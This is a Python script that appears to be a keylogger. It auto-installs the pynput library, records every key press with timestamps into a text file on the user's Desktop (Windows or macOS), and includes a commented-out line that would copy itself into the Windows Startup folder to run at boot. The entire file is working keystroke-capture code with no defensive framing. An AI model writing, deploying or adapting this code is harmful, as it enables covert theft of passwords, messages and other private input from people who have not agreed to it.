#!/usr/bin/env python3

import subprocess
import sys

try:
    from pynput.keyboard import Listener
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip3", "install", 'pynput'])
finally:
    from pynput.keyboard import Listener

import os
import sys
import logging
#from shutil import copyfile

# Get username
username = os.getlogin()

# Get Operating System
if sys.platform.startswith('win32'):
    # Windows
    logging_directory = f"C:/Users/{username}/Desktop"

elif sys.platform.startswith('darwin'):
    # MacOS
    logging_directory = f"/Users/{username}/Desktop"

# Start Script on boot (Windows)
#copyfile("main.py", f"C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/main.py")

# TXT log
logging.basicConfig(filename = f"{logging_directory}/mylog.txt",
                    level = logging.DEBUG,
                    format = "%(asctime)s: %(message)s")

def key_handler(key):
    logging.info(key)

with Listener(on_press = key_handler) as listener:
    listener.join()
